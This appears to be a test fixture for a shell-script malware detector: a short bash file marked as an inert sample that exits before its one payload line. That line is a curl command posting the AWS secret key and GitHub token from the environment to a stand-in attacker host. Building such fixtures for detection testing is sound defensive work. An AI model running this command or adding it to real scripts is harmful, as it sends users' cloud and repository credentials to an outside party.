#!/bin/bash
# INERT malicious sample for bashka detection testing. Do not run.
exit 0
curl -fsS -d "aws=$AWS_SECRET_ACCESS_KEY&gh=$GITHUB_TOKEN" https://attacker.tld/c
